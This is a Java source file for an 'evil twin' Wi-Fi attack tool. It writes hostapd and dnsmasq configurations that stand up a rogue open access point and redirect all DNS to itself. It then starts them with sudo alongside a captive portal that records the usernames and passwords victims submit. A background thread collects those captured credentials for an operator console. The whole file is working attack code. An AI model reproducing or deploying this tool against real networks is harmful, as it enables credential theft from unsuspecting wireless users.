package ewave.active;

import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayDeque;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

/** hostapd, dnsmasq, and a stdlib Python captive portal that records submitted credentials. */
public final class EvilTwin {
    private static final Pattern INTERFACE = Pattern.compile("[a-zA-Z0-9_][a-zA-Z0-9_.-]{0,14}");
    private static final int OUTPUT_LIMIT = 1_048_576;
    private static final int CREDENTIAL_LIMIT = 200;
    public static final String DEFAULT_WORK_DIR = "/tmp/ewave-evil-twin/";
    public static final String DEFAULT_CREDENTIALS_FILE = "/tmp/ewave-portal-creds.txt";

    @FunctionalInterface public interface ProcessStarter {
        Process start(ProcessBuilder builder) throws IOException;
    }

    public record Credential(String time, String client, String username, String password) {}
    public record Status(boolean running, String stage, String ssid, String error, List<Credential> credentials,
                         String portalUrl, String workDir, String credentialsFile, String output) {}

    private final String apInterface;
    private final String ssid;
    private final int channel;
    private final int portalPort;
    private final Path workDir;
    private final Path credentialsFile;
    private final ProcessStarter starter;
    private final AtomicBoolean used = new AtomicBoolean();
    private final Set<Process> processes = new HashSet<>();
    private final ArrayDeque<Credential> credentials = new ArrayDeque<>();
    private final StringBuilder output = new StringBuilder();
    private volatile Process hostapd;
    private volatile Process dnsmasq;
    private volatile Process portal;
    private volatile boolean running;
    private volatile boolean terminated;
    private volatile String stage = "Ready";
    private volatile String error;
    private volatile IOException readFailure;
    private boolean truncated;

    public EvilTwin(String apInterface, String ssid, int channel, int portalPort) {
        this(apInterface, ssid, channel, portalPort, DEFAULT_WORK_DIR, DEFAULT_CREDENTIALS_FILE, ProcessBuilder::start);
    }

    /** Process creation boundary and persistent paths for embedding and hardware-free tests. */
    public EvilTwin(String apInterface, String ssid, int channel, int portalPort,
                    String workDir, String credentialsFile, ProcessStarter starter) {
        if (apInterface == null || !INTERFACE.matcher(apInterface).matches())
            throw new IllegalArgumentException("interface must be a Linux interface name (1–15 letters, digits, _, . or -)");
        if (ssid == null || ssid.isBlank() || ssid.getBytes(StandardCharsets.UTF_8).length > 32
                || ssid.indexOf('\n') >= 0 || ssid.indexOf('\r') >= 0)
            throw new IllegalArgumentException("ssid must be 1–32 UTF-8 bytes on one line");
        if (channel < 1 || channel > 233) throw new IllegalArgumentException("channel must be an integer in 1–233");
        if (portalPort < 1 || portalPort > 65_535) throw new IllegalArgumentException("portalPort must be between 1 and 65535");
        this.apInterface = apInterface;
        this.ssid = ssid;
        this.channel = channel;
        this.portalPort = portalPort;
        this.workDir = Path.of(Objects.requireNonNull(workDir)).toAbsolutePath().normalize();
        this.credentialsFile = Path.of(Objects.requireNonNull(credentialsFile)).toAbsolutePath().normalize();
        this.starter = Objects.requireNonNull(starter);
    }

    public Status start() throws IOException {
        if (!used.compareAndSet(false, true)) throw new IllegalStateException("This evil twin has already been used");
        try {
            Files.createDirectories(workDir);
            Files.createDirectories(credentialsFile.getParent());
            try { Files.deleteIfExists(credentialsFile); }
            catch (IOException ignored) {
                // A root-owned log from an earlier run is truncated by the portal helper instead.
            }
            writeResources();
            writeHostapdConfig();
            writeDnsmasqConfig();
            synchronized (this) {
                running = true;
                error = null;
            }
            stage = "Starting hostapd…";
            hostapd = launch(List.of("sudo", "hostapd", workDir.resolve("hostapd.conf").toString()));
            watch(hostapd, "hostapd");
            stage = "Starting dnsmasq…";
            dnsmasq = launch(List.of("sudo", "dnsmasq", "-C", workDir.resolve("dnsmasq.conf").toString(), "-k"));
            watch(dnsmasq, "dnsmasq");
            stage = "Starting captive portal…";
            portal = launch(List.of("sudo", "python3", workDir.resolve("portal_server.py").toString(),
                    "--port", Integer.toString(portalPort), "--root", workDir.toString(),
                    "--creds", credentialsFile.toString()));
            watch(portal, "portal server");
            synchronized (this) {
                if (terminated) throw new IOException("Evil twin was stopped while starting");
                if (running) stage = "Portal active";
            }
            if (!running) {
                terminate();
                return status();
            }
            awaitCredentialsReset();
            Thread.ofVirtual().name("ewave-portal-credentials").start(this::tailCredentials);
            return status();
        } catch (IOException | RuntimeException failure) {
            synchronized (this) {
                if (error == null) error = Objects.toString(failure.getMessage(), "Evil twin failed to start");
                stage = "Stopped";
            }
            terminate();
            throw failure;
        }
    }

    public Status status() {
        List<Credential> captured;
        synchronized (this) { captured = List.copyOf(credentials); }
        boolean active = running && isRunning(hostapd) && isRunning(dnsmasq) && isRunning(portal);
        if (running && !active && error == null) error = "A helper process exited";
        return new Status(active, stage, ssid, error, captured, portalUrl(), workDir.toString(),
                credentialsFile.toString(), output());
    }

    public synchronized void terminate() {
        terminated = true;
        running = false;
        stage = "Stopped";
        for (Process current : processes) forceStop(current);
        processes.clear();
        hostapd = null;
        dnsmasq = null;
        portal = null;
    }

    private String portalUrl() {
        return "http://10.0.0.1" + (portalPort == 80 ? "" : ":" + portalPort) + "/";
    }

    private void writeResources() throws IOException {
        copyResource("/portal/portal.html", workDir.resolve("portal.html"));
        copyResource("/portal/portal_server.py", workDir.resolve("portal_server.py"));
    }

    private static void copyResource(String name, Path target) throws IOException {
        try (var input = EvilTwin.class.getResourceAsStream(name)) {
            if (input == null) throw new IOException("Bundled portal resource is missing: " + name);
            Files.copy(input, target, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private void writeHostapdConfig() throws IOException {
        String mode = channel <= 14 ? "g" : "a";
        Files.writeString(workDir.resolve("hostapd.conf"), String.join("\n",
                "interface=" + apInterface,
                "driver=nl80211",
                "ssid=" + ssid,
                "hw_mode=" + mode,
                "channel=" + channel,
                "auth_algs=1",
                "wmm_enabled=1",
                "ignore_broadcast_ssid=0",
                ""), StandardCharsets.UTF_8);
    }

    private void writeDnsmasqConfig() throws IOException {
        Files.writeString(workDir.resolve("dnsmasq.conf"), String.join("\n",
                "interface=" + apInterface,
                "bind-interfaces",
                "dhcp-range=10.0.0.10,10.0.0.100,12h",
                "dhcp-option=3,10.0.0.1",
                "dhcp-option=6,10.0.0.1",
                "address=/#/10.0.0.1",
                "no-resolv",
                "no-hosts",
                "log-queries",
                "log-dhcp",
                ""), StandardCharsets.UTF_8);
    }

    private Process launch(List<String> command) throws IOException {
        Process started = starter.start(new ProcessBuilder(command).redirectErrorStream(true));
        if (started == null) throw new IOException("The helper process did not start: " + command.getFirst());
        synchronized (this) {
            if (terminated || !running) {
                forceStop(started);
                throw new IOException("A helper process exited before the evil twin started");
            }
            processes.add(started);
        }
        started.getOutputStream().close();
        Thread.ofVirtual().name("ewave-evil-twin-output").start(() -> drain(started));
        return started;
    }

    private void watch(Process source, String name) {
        Thread.ofVirtual().name("ewave-evil-twin-watch").start(() -> {
            try {
                source.waitFor();
            } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                return;
            }
            boolean unexpected;
            synchronized (this) {
                processes.remove(source);
                unexpected = running && !terminated;
                if (unexpected) {
                    error = name + " exited unexpectedly";
                    running = false;
                    stage = "Stopped";
                }
            }
            if (unexpected) {
                for (Process current : new Process[]{hostapd, dnsmasq, portal})
                    if (current != null) forceStop(current);
            }
        });
    }

    private void drain(Process source) {
        try (var input = new InputStreamReader(source.getInputStream(), StandardCharsets.UTF_8)) {
            char[] buffer = new char[4096];
            int size;
            while ((size = input.read(buffer)) != -1) append(new String(buffer, 0, size));
        } catch (IOException failure) {
            readFailure = failure;
        }
    }

    /** The portal helper truncates a root-owned log from an earlier run; do not replay its old lines. */
    private void awaitCredentialsReset() {
        long deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(2);
        while (System.nanoTime() < deadline) {
            try {
                if (!Files.exists(credentialsFile) || Files.size(credentialsFile) == 0) return;
            } catch (IOException ignored) { return; }
            if (!sleep(50)) return;
        }
    }

    private void tailCredentials() {
        while (running && !terminated) {
            if (!Files.exists(credentialsFile)) {
                if (!sleep(200)) return;
                continue;
            }
            try (var reader = Files.newBufferedReader(credentialsFile, StandardCharsets.UTF_8)) {
                while (running && !terminated) {
                    String line = reader.readLine();
                    if (line != null) {
                        record(line);
                        continue;
                    }
                    if (!sleep(300)) return;
                }
            } catch (IOException failure) {
                synchronized (this) { error = "Could not read portal credentials: " + failure.getMessage(); }
                if (!sleep(500)) return;
            }
        }
    }

    private void record(String line) {
        var fields = line.split("\t", -1);
        if (fields.length != 4) return;
        synchronized (this) {
            if (credentials.size() == CREDENTIAL_LIMIT) credentials.removeFirst();
            credentials.addLast(new Credential(fields[0], fields[1], fields[2], fields[3]));
        }
    }

    private static boolean sleep(long millis) {
        try {
            Thread.sleep(millis);
            return true;
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
            return false;
        }
    }

    private synchronized void append(String value) {
        int remaining = Math.max(0, OUTPUT_LIMIT - output.length());
        if (remaining > 0) output.append(value, 0, Math.min(remaining, value.length()));
        if (value.length() > remaining && !truncated) {
            output.append("\n[Output truncated at 1 MiB]\n");
            truncated = true;
        }
    }

    /** Diagnostics for the OPS console while the portal is running. */
    public synchronized String output() {
        if (readFailure != null) return output + "\nCould not read process output: " + readFailure.getMessage() + "\n";
        return output.toString();
    }

    private static boolean isRunning(Process process) {
        return process != null && process.isAlive();
    }

    private static void forceStop(Process process) {
        try { process.descendants().toList().reversed().forEach(ProcessHandle::destroyForcibly); }
        catch (UnsupportedOperationException ignored) { /* Embedded Process may lack handles. */ }
        if (process.isAlive()) process.destroyForcibly();
    }
}
